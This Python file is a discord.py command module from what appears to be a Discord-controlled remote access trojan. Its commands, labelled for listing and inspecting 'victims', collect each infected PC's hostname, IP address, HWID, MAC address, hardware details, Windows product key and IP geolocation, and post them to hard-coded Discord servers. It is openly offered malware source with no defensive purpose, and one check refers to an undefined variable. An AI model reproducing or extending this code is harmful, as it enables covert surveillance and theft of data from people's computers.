import discord
from discord import app_commands
from discord.ext import commands

from core.info import Info
from utils import CheckHwid, SendOutput

pc = Info()

class OtherCommands(commands.Cog, description='Other Commands'):
	def __init__(self, bot: commands.Bot) -> None:
		self.bot = bot

	@commands.Cog.listener()
	async def on_ready(self):
		print("--- Loaded OtherCommands module")

	@app_commands.command(description='List All Victim')
	async def list(self, interaction):
		vic = discord.Embed(title = f'Victim {pc.HostName()}', description = f'**__INFORMATION__**\n```autohotkey\nIP: {pc.IP()}\nHWID: {pc.HWID()}\n```')
		await interaction.response.send_message(embed = vic)

	@app_commands.command(description='Get Information of PC Victim')
	async def getinformation(self, interaction, hwid: str, ):
		if not CheckHwid(HWID):
			return
		information_embed = discord.Embed(description=f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nHWID: {pc.HWID()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```")
		await interaction.response.send_message(embed = information_embed)

async def setup(bot):
	await bot.add_cog(OtherCommands(bot), guilds = [discord.Object(id = 1128326638757761125), discord.Object(id = 1117628520273813536)])